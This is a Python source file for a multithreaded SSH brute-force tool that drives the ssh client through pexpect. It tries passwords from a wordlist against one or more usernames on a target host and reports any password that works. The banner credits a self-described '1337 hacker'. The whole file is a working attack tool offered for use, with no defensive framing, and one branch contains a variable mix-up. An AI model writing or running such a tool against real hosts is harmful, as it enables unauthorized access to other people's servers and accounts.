import pexpect
import sys
import argparse
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor
import concurrent.futures
prompt=['\$ ','# ','>> ','/ ','// ','@ ','> ','~']
def connect(host,user,password,port):
    try:
        ssh_prompt="Are you sure you want to continue connecting"
        ssh_cmd='ssh '+user+'@'+host+' -p '+port
        obj=pexpect.spawn(ssh_cmd)
        #if 'Couldnt res'
        ret_val=obj.expect([pexpect.TIMEOUT,ssh_prompt,'[P|p]assword: '])
        if(ret_val==0):
            return '[-]Error in Connecting with rsa fingerprint'
        obj.sendline('yes')
        ret_val=obj.expect([pexpect.TIMEOUT,'[P|p]assword: '])
        if(ret_val==0):
            return '[-]Error in connecting'
        obj.sendline(password)
        ret_val=obj.expect(prompt,timeout=1)
        if(ret_val==0):
            ret_val=obj.expect(user,timeout=1)
        if(ret_val!=0):
            return '[+]Correct Password for the user:'+user+' is '+password
        else:
            return '[-]Wrong Password:'+password
    except pexpect.exceptions.TIMEOUT:
        return '[-]Wrong Password:'+password
    except KeyboardInterrupt:
        print('Goodbye.....')
        sys.exit()
    except pexpect.exceptions.EOF:
        return 'The host might not be up or the host couldnt be resolved or there may be some configuration that stops the brute force in this case minimize the no of threads '
def main():
    try:
        banner='''                    |                |                |              
 |   |  _ \  |   |  __|  _ \   _ \   __ \   __| |   | __| |   |  __| 
 |   | (   | |   |  |   (   | (   |  |   | |    |   | |   |   |\__ \ 
\__, |\___/ \__,_| \__|\___/ \___/  _.__/ _|   \__,_|\__|\__,_|____/ 
____/                                                                
Created  by hackzzdogs 1337 hacker This program may take some time to close because of multithreads
'''
        print(colored(banner,'green'))
        parser_obj=argparse.ArgumentParser(description='SSH brute forcer',usage='''youtoobrutus.py --host <target> -p <port> -u user or -uf <userfile> --pass password or -pf <passfile> -t <no of threads> \n use -h for more info''')
        parser_obj.add_argument('--host',dest='host',help='Host to brute force')
        parser_obj.add_argument('-p','--port',dest='port',help='The port to attack')
        parser_obj.add_argument('-uf',dest='userlist',help='The userlist to bruteforce')
        parser_obj.add_argument('-u','--username',dest='user',help='SSH Username')
        parser_obj.add_argument('--pass',dest='password',help='SSH Password ')
        parser_obj.add_argument('-pf','--passfile',dest='passlist',help='Password list to bruteforce')
        parser_obj.add_argument('-t',dest='threads',help='No of asynchronous threads specify values between 1-5')
        parser=parser_obj.parse_args()
        if not((parser.host!=None and (parser.user!=None or parser.userlist!=None)and(parser.password!=None or parser.passlist!=None))):
            print(parser_obj.usage)
            sys.exit()
        if(parser.user!=None and parser.userlist!=None):
            print('Enter either a userfile or a username \nUse -h for more details')
            sys.exit()
        if(parser.passlist!=None and parser.password!=None):
            print('Enter either a passfile or password \nUse -h for more details')
            sys.exit()
        if(parser.port==None):
            port='22'
        else:
            port=parser.port
        #Variable assingment
        if(parser.threads!=None):
            thread=int(parser.threads)
        else:
            thread=3
        host=parser.host
        password=parser.password
        passlist=parser.passlist
        userfile=parser.userlist
        user=parser.user
        passlist=parser.passlist
        if(userfile!=None):#if userfile exists
            uf=open(userfile,'r')
            ul=[u for u in uf.readlines()]
            if(passlist!=None):
                with ThreadPoolExecutor(max_workers=thread) as tp:
                    passfile=open(passlist,'r')
                    pl=[p for p in passfile.readlines()]
                    fobj=[tp.submit(connect,host,u.strip('\n'),pw.strip('\n'),port) for u in ul for pw in pl ] 
                    for future in concurrent.futures.as_completed(fobj):
                            ret_string=future.result()
                            if 'The host' in ret_string:
                                print(colored(ret_string,'red'))
                                sys.exit()
                                break
                            if 'Error' in ret_string:
                                print(colored(ret_string,'red'))
                                continue
                            if 'Wrong' in ret_string:
                                print(colored(ret_string,'red'))
                            if 'Correct' in  ret_string :
                                print(colored(ret_string,'green'))
                                sys.exit()
                            else:
                                print(ret_string)  
            else:
                with ThreadPoolExecutor(max_workers=thread) as tp:
                    fobj=[tp.submit(connect,host,u.strip('\n'),password,port) for u in ul]
                    for future in concurrent.futures.as_completed(fobj):
                        obj=future.result()
                        if('Error' in obj):
                            print(colored(obj,'red'))
                            continue
                        if 'Wrong' in ret_string:
                                print(colored(ret_string,'red'))
                        if 'Correct' in obj:
                            print(colored(obj,'green'))
                            sys.exit()
        else:#userfile not exists
            if(passlist!=None):
                with ThreadPoolExecutor(max_workers=thread) as tp:
                    passfile=open(passlist,'r')
                    pl=[p for p in passfile.readlines()]
                    fobj=[tp.submit(connect,host,user,pw.strip('\n'),port) for pw in pl]
                    for future in concurrent.futures.as_completed(fobj):
                        ret_string=future.result()
                        if 'Error' in ret_string:
                            print(colored(ret_string,'red'))
                            continue
                        if 'Wrong' in ret_string:
                                print(colored(ret_string,'red'))
                        if 'Correct' in  ret_string:
                            print(colored(ret_string,'green'))
                            sys.exit()
                        else:
                            print(colored(ret_string,'red'))  
            else:
                obj=connect(host,user,password,port)
                if('Wrong'in obj or 'Error' in obj ):
                    print(colored(obj,'red'))
                    sys.exit()    
                else:
                    print(colored('Correct password:'+password,'green'))
                    sys.exit()
    except KeyboardInterrupt:
        print('Goodbye .......')
        sys.exit()
main()
